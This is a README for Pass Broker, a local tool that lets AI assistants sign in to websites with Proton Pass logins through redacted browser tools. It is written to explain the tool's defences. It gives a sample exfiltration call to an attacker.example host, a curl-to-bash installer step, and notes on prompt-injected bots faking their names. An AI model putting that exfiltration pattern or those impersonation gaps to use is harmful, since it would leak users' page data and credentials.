# Pass Broker

[![CI](https://github.com/asafelobotomy/pass-broker/actions/workflows/ci.yml/badge.svg)](https://github.com/asafelobotomy/pass-broker/actions/workflows/ci.yml)

Lets AI assistants such as Grok Bot or Claude sign in to websites with your Proton Pass
logins and 2FA codes, without the assistant ever seeing a password, a code or your
Proton Pass token.

Everything secret stays on your PC. The assistant connects to the broker as a remote MCP
server and drives a browser **on your PC** through redacted tools. It gets handles,
masked snapshots and blacked-out screenshots, never values.

```
Grok Bot (xAI / Cursor cloud)
   │  HTTPS + OAuth token (held by Cursor's connector backend, never the Bot)
   ▼
Tailscale Funnel ──▶ passbroker on 127.0.0.1:8787  (your PC)
                         ├─ checks the token, the site, your approval
                         ├─ pass-cli ──▶ Proton Pass  (token from your keyring, Agent vault only)
                         └─ Chromium on your PC  (fills + submits; secrets never returned)
```

## Security

Every secret stays on your PC, every use needs your approval on your desktop, and assistants only
ever get handles, masked snapshots and blacked-out screenshots. **[SECURITY.md](SECURITY.md)** has
the threat model, what protects what, what it can't stop, and how to report a vulnerability.

## Requirements

- Linux with a desktop that shows notifications (`notify-send`; KDE Plasma and GNOME both work).
- Python 3.11 or newer and [uv](https://docs.astral.sh/uv/); Rust 1.85 or newer to build the wizard.
- [Proton Pass CLI](https://protonpass.github.io/pass-cli/) (`pass-cli`), and Chromium for the
  broker's browser (`uv run playwright install chromium`; the wizard can do this for you).
- Optional, per feature: Tailscale (Funnel), `gpg`, `openssl`, `7z` (7-Zip 21 or newer) and
  `keepassxc-cli` (file unlocking), Proton Mail Bridge (email codes), `ssh` (device actions),
  systemd (background service).

## Set up with the wizard (easiest)

```bash
uv sync
```

```bash
cargo build --release --manifest-path wizard/Cargo.toml
```

```bash
wizard/target/release/passbroker-wizard
```

The wizard (Rust, Slint) walks through six steps in order:
1. Requirements
2. Proton Pass token
3. Check the vault
4. Remote access
5. Unlocking & devices (optional, "Skip and lock"): file actions, encryption keys, home-device actions, email codes
6. Connect assistants

Each step **locks once you confirm it**. To change one, press **Unlock to edit** and confirm. A
step that depends on one you change, such as the vault check after a new token, has to be done
again. Setup can't be unlocked while the broker runs. The **Control center** starts and stops the
broker and Funnel, lists connected apps, and shows activity. **Revoke** and **Emergency stop** are
never locked.

The broker's browser runs **hidden**, so it never pops up over what you're doing. The Control
center shows each bot's tab live instead, about once a second, view-only. These pictures are
masked exactly like the screenshots bots get: password and code fields are blacked out, and no
picture is taken at all while a page shows a secret as text. They're only made while the Control
center is on screen, kept in memory (`$XDG_RUNTIME_DIR`, never your disk) where only you can read
them, and deleted when the session ends or the broker stops. Turn on **Own window** there (while the
broker is stopped) if you'd rather have a real window, for example to solve a CAPTCHA yourself.

The wizard drives the broker through `passbroker api …`, a JSON interface, and never handles the
Proton Pass token except to pipe a pasted one straight into the keyring. It finds `passbroker` on
your PATH, or this project's `.venv`, or wherever `$PASSBROKER_CLI` points.

To add it to your app menu:

```bash
install -Dm755 wizard/target/release/passbroker-wizard ~/.local/bin/passbroker-wizard
```

```bash
install -Dm644 packaging/passbroker.desktop ~/.local/share/applications/passbroker.desktop
```

```bash
install -Dm644 packaging/passbroker.svg ~/.local/share/icons/hicolor/scalable/apps/passbroker.svg
```

## Set up from the command line

### 1. Install

```bash
curl -fsSL https://proton.me/download/pass-cli/install.sh | bash
```

```bash
uv tool install --from . passbroker
```

```bash
uvx --from playwright playwright install chromium
```

### 2. Make an Agent vault and an agent token

In Proton Pass, create a vault called **Agent** and move only the logins you want assistants to
use into it. Each needs its website saved, or it can't be filled anywhere. Then, signed in to
pass-cli as yourself (`pass-cli login`):

```bash
pass-cli agent create passbroker --expiration 1m --vault Agent
```

An agent is an access token that can only view that vault, and every read it makes is logged with
the broker's reason (`pass-cli agent monitor passbroker`). Sign out again afterwards with
`pass-cli logout`.

Store the token. The prompt hides your input, and the token goes into KWallet or the Secret Service:

```bash
passbroker set-token
```

Check what assistants will see. This lists titles and sites, and reads no passwords:

```bash
passbroker check
```

### 3. Local assistants only: give each one a fixed token

Grok doesn't need this, because it connects with OAuth (step 6 below). For an assistant on this PC that
can send its own header, such as Claude:

```bash
passbroker add-client claude
```

The token is printed once. Revoke it with `passbroker remove-client claude`.

### 4. Run it

```bash
passbroker serve --public-host pass.example.com
```

A Chromium window opens so you can watch what the assistant does. Add `--headless` to keep it
off your desktop; the wizard then shows it live in its Control center instead.
Approvals appear as desktop notifications with **Allow** and **Deny**. If nobody answers in 60
seconds, it's denied. `--grant-minutes 0` asks every time.

### 5. Expose it to Grok with Tailscale Funnel

It has to be **Funnel**, not Serve. Grok's connectors call from Cursor's servers, which aren't on
your tailnet. Funnel publishes the broker at `https://<this-pc>.<tailnet>.ts.net`, with TLS
handled by Tailscale. The broker still requires the bearer token on every request.

One-time setup:

```bash
run0 pacman -S tailscale
```

```bash
run0 systemctl enable --now tailscaled
```

```bash
run0 tailscale up
```

```bash
run0 tailscale set --operator=$USER
```

In the Tailscale admin console, turn on HTTPS certificates (DNS page) and allow Funnel for this
machine (Access controls → `nodeAttrs` with `"attr": ["funnel"]`). The first `tailscale funnel`
run prints a link that does this for you.

Then, each time (the app's **Run** page does this for you):

```bash
tailscale funnel --bg --https=443 http://127.0.0.1:8787
```

```bash
passbroker serve --public-host <this-pc>.<tailnet>.ts.net
```

Turn it off with `tailscale funnel --https=443 off`. With `--bg`, Funnel keeps running after the
command exits. If the app or the broker crashes, the address answers with an error until you turn
Funnel off.

### 6. Connect Grok (OAuth)

First open the pairing window, which lasts 10 minutes and allows one connection:

```bash
passbroker api pair
```

Then ask Grok to add a custom MCP server **by URL**, `https://<this-pc>.<tailnet>.ts.net/mcp`, with
**OAuth and no token or header**. Then:

1. Grok's app opens a **Pass Broker sign-in page**.
2. A notification on your PC shows a code like `K7QM-42XR`.
3. Type it on the page, name the connection (`grok`) and press **Connect**.

The resulting tokens stay on Cursor's connector backend, so the Bot never sees them. The
connection shows under **Assistants → Connected apps** in the app, where **Revoke** cuts it off.

Only type a code on a page you opened yourself. A code notification you didn't expect means someone
else is trying, so ignore it. Without the code they get nowhere.

Every bot on your Grok account shares one connector. Bots name themselves, and each gets its own
access list, approvals and browser session (see below). The names are self-reported, so a bot that
lies about its name can use another bot's grants. Approvals guard password and code fills, not what
happens after sign-in.

> **Not verified:** that Grok Bot's connector supports MCP's OAuth flow (dynamic client
> registration, PKCE). It follows the MCP specification, and the full flow is tested here against a
> standard client.

## Features

### File unlocking

Vault items without a website, such as an archive passphrase, can open passphrase-locked files.
You set up **actions** in the wizard (step 5, optional), stored in
`~/.config/passbroker/unlockers.json`. Each action ties together:
- one vault item;
- one built-in tool;
- the folder(s) whose files it may open;
- where results go;
- whether the result is shown to the assistant.

| Tool | What it does | Result |
|---|---|---|
| `gpg-decrypt` | passphrase-encrypted `.gpg`/`.asc` | decrypted file in the output folder |
| `openssl-decrypt` | `openssl enc -aes-256-cbc -pbkdf2` files | decrypted file in the output folder |
| `7z-extract` | password-protected `.7z`/`.zip` | new folder in the output folder |
| `7z-list` | what's inside an archive | the listing, shown to the assistant |
| `keepassxc-list` | KeePassXC database entry titles (never passwords) | the titles, shown to the assistant |

Assistants call `list_unlockers`, `list_locked_files`, then `unlock_file(action, file)`. They choose
only an action and a file inside its folders. They never choose the command, the item or the
output path, and every unlock needs your desktop Allow, which names the file and says whether the
result will be shown to them.

The passphrase goes to the tool on stdin, never on the command line. `gpg` runs with
`--no-symkey-cache`, so its agent doesn't keep the passphrase. Output is scrubbed and size-limited.
Failed attempts leave nothing behind. Folders must be specific folders inside your home folder.
Links that lead outside them are refused. An archive that tries to write outside its folder is
deleted.

Returning decrypted content to the assistant is **off by default**: turn it on per action only for
files you're happy to send to xAI/Cursor.

### Encrypted text, home devices and email codes

- **Encryption keys** (`list_keys`, `encrypt_text`, `decrypt_text`): a key is a name for a vault
  item whose password is the passphrase. Bots store encrypted text (a security log, a ledger) with
  no key beside it. Encrypting needs no approval. Decrypting needs your Allow, and the decrypted text
  goes to the bot. `gpg` runs in a fresh, empty home folder, with the passphrase on a separate pipe.
- **Home-device actions** (`list_device_actions`, `run_device_action`; optional): Wake-on-LAN, one
  fixed SSH command on a home server (the vault password on its stdin, your SSH keys for the login),
  or an HTTP call to a device (basic auth, a bearer token, or `{secret}` in the body). Actions never
  target this PC, and the target is checked again before every run. Bots see `done` or `failed`,
  plus output only if you allow it.
- **Email codes** (`fill_email_code`): the broker logs in to Proton Mail Bridge on this PC (IMAP,
  credentials from a vault item), takes the code from the newest message sent by the site's domain
  in the last few minutes (left unread), and fills it in pinned like a password. The bot never sees
  the code or the mail.

### Per-bot access and sessions

- Each bot gets **its own browser session** (cookies, tab, idle sign-out), so one bot can't use a
  site another signed in to.
- A **new bot can use nothing** until you grant it logins, unlock actions, keys, devices and email
  codes with **Access…** in the wizard (or `passbroker api bot-access NAME` with JSON on stdin:
  `logins`, `unlock`, `keys`, `devices`, `email_codes`, `personal_details`, `sites_limited`, `sites`,
  `blocked_pages`).
  Bots only see what they're granted.
- **Personal details are masked** in everything a bot reads from pages: emails, phone, card and
  bank numbers become `[email]`, `[phone]`, `[card number]`, `[bank account]`, and are blacked out
  in its screenshots. Whatever a bot reads stays in the assistant's chat history, and those
  histories have leaked. Turn on **May see personal details** in Access… for a bot that needs them.
  It's pattern matching, so names and street addresses in page text aren't caught.
- **May open only these sites** (Access…) keeps a bot's browser on the sites you list plus its
  granted logins' sites, subdomains included. Pages it opens, links it clicks, popups and redirects
  all stay inside, so a tricked bot can't send page data out through
  `open_url("https://attacker.example/?d=...")`. Off by default.
- **Pages it may never see** (Access…) blocks chosen pages on sites a bot may otherwise use, such
  as `amazon.co.uk/gp/your-account/payments` or `paypal.com/myaccount/settings*`: a site, then the
  start of the page's address, with `*` matching anything (a site alone blocks all of it). A blocked
  page doesn't load and the tab stays where it was. Sites that switch pages without loading one are
  caught on the bot's next look, and the tab goes back. Nothing is ever filled into a blocked page.
- `end_session` signs a bot's browser out when its task is done.
- Bots pass a `reason`, which is shown in your approval.
- The typing tool refuses password and code fields, and any text containing a known secret.
- Each connection is limited to 300 calls per 10 minutes and 20 bot names. New-bot notifications
  are capped at 10 an hour.

### Connecting a new app: the pairing window

OAuth sign-ins are refused unless you pressed **Connect an app** in the wizard within the last
10 minutes, and the window closes after one connection. So a sign-in link someone else sends you
can't start one, even though every Grok user's connector returns to `cursor.com`.

### Bots

Every tool takes a required `bot` argument: the calling bot's own name, such as `mailbot`.
- **Approvals** read "mailbot (via conn1) wants to sign in to github.com", and each bot needs its
  own Allow.
- **The activity log** records the bot on every line.
- **New bots** trigger a desktop notification the first time they call.
- **Switches:** the wizard's Bots list has an on/off switch per bot (or use
  `passbroker api bot-enable mailbot --off`). A switched-off bot's calls are refused.

Names are **self-reported**: a misbehaving or prompt-injected bot can claim another bot's name. The
switch guards against mistakes and gives you transparency. **Revoke** (which cuts off every bot on
that connection) is the real off switch.

## Running in the background

Turn on **Run in the background** in the wizard's Control center, or install the service yourself
with the same options you'd pass to `serve`:

```bash
uv run passbroker api service-install --vault Agent --public-host <this-pc>.<tailnet>.ts.net
```

```bash
systemctl --user start passbroker
```

The service starts at login, restarts if it fails, and turns Tailscale Funnel off whenever it stops,
even after a crash. It runs sandboxed: no privilege gain, a private `/tmp`, the system read-only, and
writes limited to the broker's folders and your unlock output folders. Reinstall after changing
unlock actions; the wizard does this every time it starts the service. Logs go to
`journalctl --user -u passbroker`. Remove it with `passbroker api service-uninstall`.

## Checking the audit log

```bash
uv run passbroker api audit-verify
```

It reports how many entries the chain covers, its head hash, or the first line that doesn't follow
the one before it. Note the head hash somewhere else now and then: a program running as you could
rewrite the whole chain, but not without changing the head.

## Rotating and revoking

- Grok: **Revoke** under Assistants → Connected apps (or delete `~/.config/passbroker/oauth.json`
  to cut off every connected app), then connect again.
- Local assistant token: `passbroker remove-client claude`, then `passbroker add-client claude`.
- Agent token: `pass-cli agent renew passbroker --expiration 1m`, then `passbroker set-token`.
  Or `pass-cli agent delete passbroker` to cut everything off at once.
- Signed-in sessions: delete `~/.local/share/passbroker/profile`.

## Tests

```bash
uv run pytest -q
```

The Python tests drive a real headless Chromium against a local test site, the full HTTP + MCP path, the OAuth sign-in (wrong codes, replays, refresh rotation, revoke), the
setup steps (against fake `pass-cli` and `tailscale`), and the fixes from the security review
(navigation during approval, split code boxes, private addresses, phishing registrations, refresh
replay).
They check that no password, 2FA code or Proton token appears in any tool result, error, server
log or audit line, including on a page built to leak, wrong-origin pages, cross-site iframes,
denied approvals and forged client headers.

A few `serve` switches exist only for the tests (auto-approve, a mock vault, no network guard, no
pairing window). They refuse to work unless `PASSBROKER_TEST_MODE=1` is set, which the test suite
does for its own throwaway brokers. Never set it for a real broker.

CI runs the Python tests on 3.11 to 3.14, the wizard's clippy and tests, and a gitleaks secret scan
on every push and pull request.

Every source file is kept to at most 400 lines; `tests/test_loc.py` enforces it. The wizard has its
own tests:

```bash
cargo test --manifest-path wizard/Cargo.toml
```

## License

MIT. See [LICENSE](LICENSE).
